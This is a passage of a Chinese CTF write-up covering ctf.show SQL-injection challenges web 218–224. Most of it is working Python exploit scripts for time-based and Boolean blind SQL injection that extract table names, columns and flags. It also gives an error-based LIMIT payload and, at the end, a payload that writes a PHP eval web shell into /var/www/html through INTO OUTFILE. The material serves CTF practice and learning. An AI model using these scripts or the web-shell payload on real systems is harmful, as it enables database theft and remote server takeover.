        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">min</span> <span class="token operator">=</span> j
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><h2 id="web-218-笛卡尔积"><a href="#web-218-笛卡尔积" class="header-anchor">#</a> web 218 笛卡尔积</h2> <p>参考：<a href="https://exp10it.io/2022/07/ctfshow-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5-web198-220-writeup/#web218" target="_blank" rel="noopener noreferrer"> X1r0z Blog<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>大佬准备的sql笛卡尔积查询payload，在我windows本地跑查询时间0.059s，要在linux下吗？</p> <p>1.2秒左右payload</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> A<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span>schemata B<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span>schemata C<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span>schemata D<span class="token punctuation">,</span>information_schema<span class="token punctuation">.</span>schemata E<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span>schemata F<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>直接拿到题目试试，<strong>确实挺不错的</strong>，可能跑的有点小错误，多跑两次</p> <p><img src="/medias/show-sql/218.png" alt="218"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://0c8d2c19-5b35-4e2e-ad51-a96181dd7b6b.challenge.ctf.show/api/'</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span><span class="token punctuation">,</span><span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token builtin">min</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">-</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token comment"># 爆表名  ctfshow_flagxc</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;'1111') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E, information_schema.schemata F),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆列 flagaac</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;'1111') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E, information_schema.schemata F),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆金币 </span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;'1111') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&lt;</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E, information_schema.schemata F),'False')#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sub <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
        <span class="token keyword">if</span> sub <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> j
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">min</span> <span class="token operator">=</span> j
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><p>很难，但还是出来了。跑这个不要挂魔法，容易延迟容易误报</p> <h2 id="web-219-rlike"><a href="#web-219-rlike" class="header-anchor">#</a> web 219 rlike</h2> <p>过滤了rlike</p> <p>在<a href="https://www.cdxy.me/?p=789" target="_blank" rel="noopener noreferrer">【大佬博客】<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>里有用<code>rlike</code></p> <p><img src="/medias/show-sql/219.png" alt="219"></p> <p>这题还是用上题脚本跑了</p> <h2 id="web-220"><a href="#web-220" class="header-anchor">#</a> web 220</h2> <p>参考：<a href="https://hextuff.dev/2021/07/29/ctfshow-web-getting-started-sql-injection/#web220" target="_blank" rel="noopener noreferrer">【Practice - CTFSHOW WEB入门 SQL注入篇】<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>过滤了<code>substr</code>，还可以使用<code>right,left, mid</code></p> <p>励志要自己写脚本🤐</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">&quot;http://bbdb689b-386c-435c-ae43-e707b9f65a76.challenge.ctf.show:8080/api/&quot;</span>
<span class="token comment"># 表名 ctfshow_flagxcac</span>
<span class="token comment"># payload = &quot;left((select table_name from information_schema.tables where table_schema=database() limit 0,1),{})='{}'&quot;</span>
<span class="token comment"># 列名 flagaabcc</span>
<span class="token comment"># payload = &quot;left((select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1),{})='{}'&quot;</span>
<span class="token comment"># flag</span>
payload <span class="token operator">=</span> <span class="token string">&quot;left((select flagaabcc from ctfshow_flagxcac limit 0,1),{})='{}'&quot;</span>


<span class="token keyword">def</span> <span class="token function">valid_payload</span><span class="token punctuation">(</span>p<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;debug&quot;</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token string">&quot;ip&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;if(</span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span></span>
              <span class="token string-interpolation"><span class="token string">f&quot;information_schema.tables C),1) &quot;</span></span>
    <span class="token punctuation">}</span>
    time_s <span class="token operator">=</span> <span class="token boolean">None</span>
    time_e <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        time_s <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            _ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        time_e <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span>
    <span class="token keyword">return</span> time_e<span class="token operator">-</span>time_s <span class="token operator">&gt;</span> <span class="token number">4</span>


letters <span class="token operator">=</span> <span class="token string">&quot;{}_-&quot;</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
index <span class="token operator">=</span> <span class="token number">1</span>
result <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> letter <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
        load <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> result <span class="token operator">+</span> letter<span class="token punctuation">)</span>
        <span class="token keyword">if</span> valid_payload<span class="token punctuation">(</span>load<span class="token punctuation">)</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> letter
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[*] result: </span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
    index <span class="token operator">+=</span> <span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br></div></div><h2 id="web-221-limit注入"><a href="#web-221-limit注入" class="header-anchor">#</a> web 221  limit注入</h2> <div class="custom-block tip"><p class="custom-block-title">参考</p> <p><a href="https://blog.csdn.net/solitudi/article/details/110144623" target="_blank" rel="noopener noreferrer">[CTFSHOW]SQL注入(WEB入门)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></div> <p>limit联合注入版本限制(5.0.0-5.6.6)</p> <p>在<code>select *from tableName limit 1,1 (order by) $_POST['sql'];</code>sql语句这里，如果有<code>order by</code>，就不能联合注入，如果没有<code>order by</code>就可以注入</p> <p>考点：limit注入，procedure analyse()函数优化表结构</p> <p>在查询接口<code>/api/</code>传参</p> <p>payload：<code>?page=1&amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1)</code></p> <p>解释：procedure analyse(extractvalue(rand(),concat(0x3a,database())),1): procedure analyse用于分析结果，<code>extractvalue()</code> 需要的是 XML 相关的数据，而传入的却是一个随机数 <code>rand()</code>，可以爆出需要分析的数据库名称</p> <h2 id="web-222-group-by"><a href="#web-222-group-by" class="header-anchor">#</a> web 222 group by</h2> <p>分析大佬的脚本，二分法查询相关数据，利用sleep盲注，通过substr比较爆出数据，把if的结果sleep(0.05),1放在了group后面，重点应该在在时间盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url<span class="token operator">=</span><span class="token string">'http://92ed72b8-5087-4bf6-9e3e-c3797af901ec.challenge.ctf.show/api/'</span>
result<span class="token operator">=</span><span class="token string">''</span>
i<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i<span class="token operator">+=</span><span class="token number">1</span>
    head<span class="token operator">=</span><span class="token number">1</span>
    tail<span class="token operator">=</span><span class="token number">127</span>
    <span class="token keyword">while</span> head<span class="token operator">&lt;</span>tail<span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>head<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">1</span>
        <span class="token comment"># ctfshow_flaga,ctfshow_user</span>
        <span class="token comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{mid},sleep(0.05),1)&quot;</span>
        <span class="token comment"># id,flagaabc,info </span>
        <span class="token comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'),{i},1))&gt;{mid},sleep(0.05),1)&quot;</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;if(ascii(substr((select flagaabc from ctfshow_flaga),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(0.05),1)&quot;</span></span>

        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">&quot;u&quot;</span><span class="token punctuation">:</span>payload
        <span class="token punctuation">}</span>
        t1<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>data<span class="token punctuation">)</span>
        t2<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># print(t2-t1)#调试</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*]程序正在进行.....&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> t2<span class="token operator">-</span>t1<span class="token operator">&gt;</span><span class="token number">0.9</span><span class="token punctuation">:</span><span class="token comment">#这边不稳定，要调试</span>
            head<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail<span class="token operator">=</span>mid
    <span class="token keyword">if</span> head<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>
        result<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><h2 id="web-223"><a href="#web-223" class="header-anchor">#</a> web 223</h2> <p>点击去重按钮，可以在f12调试工具网络界面看到请求参数</p> <p><img src="/medias/show-sql/223.png" alt="223"></p> <p>给u随便传值，如果u是数字返回<code>{&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u5931\u8d25&quot;,&quot;count&quot;:1,&quot;data&quot;:[]}</code>,如果u是username，会返回<code>{&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[{&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;},{&quot;id&quot;:&quot;2&quot;,&quot;username&quot;:&quot;user1&quot;,&quot;pass&quot;:&quot;111&quot;},{&quot;id&quot;:&quot;3&quot;,&quot;username&quot;:&quot;user2&quot;,&quot;pass&quot;:&quot;222&quot;},{&quot;id&quot;:&quot;4&quot;,&quot;username&quot;:&quot;userAUTO&quot;,&quot;pass&quot;:&quot;passwordAUTO&quot;}]}</code></p> <p>通过返回结果不同，可以使用布尔盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token triple-quoted-string string">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;</span>
<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token string">'true'</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> res
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token string">&quot;+true&quot;</span>
        <span class="token keyword">return</span> res


url <span class="token operator">=</span> <span class="token string">&quot;http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/&quot;</span>
i <span class="token operator">=</span> <span class="token number">0</span>
res <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库-ctfshow_flagas</span>
        <span class="token comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span>
        <span class="token comment"># 查字段-flagasabc</span>
        <span class="token comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'&quot;</span>
        <span class="token comment"># 查flag</span>
        payload <span class="token operator">=</span> <span class="token string">&quot;select flagasabc from ctfshow_flagas&quot;</span>
        params <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;u&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">{</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">,username,'a')&quot;</span></span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
        <span class="token comment"># print(r.json()['data'])</span>
        <span class="token keyword">if</span> <span class="token string">&quot;userAUTO&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><h2 id="web-224"><a href="#web-224" class="header-anchor">#</a> web 224</h2> <p>参考：<a href="https://boogipop.com/2023/03/02/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/#Web224%EF%BC%88finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank" rel="noopener noreferrer">Web224（finfo文件注入）<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>访问robots.txt可以看到密码重置页面</p> <p><img src="/medias/show-sql/224.png" alt="224"></p> <p>重置密码后登录，存在一个文件上传页面</p> <p>题目检查上传文件里是否存在一些关键字<code>text</code>,<code>png</code>,<code>images</code>等等，空文件和bin文件可以上传成功。奇怪的是看大佬的wp，为什么存在这样的洞，题目会执行bin文件里的sql语句？站长想通过文件上传执行shell命令？不能直接ssh？</p> <p>上传<code>1.bin</code>，写木马到服务器，不能太长，似乎只能一句。前面要有<code>C64File &quot;')</code></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C64File <span class="token string">&quot;');select &quot;</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span>&quot; into outfile <span class="token string">'/var/www/html/3.php'</span><span class="token punctuation">;</span>--+
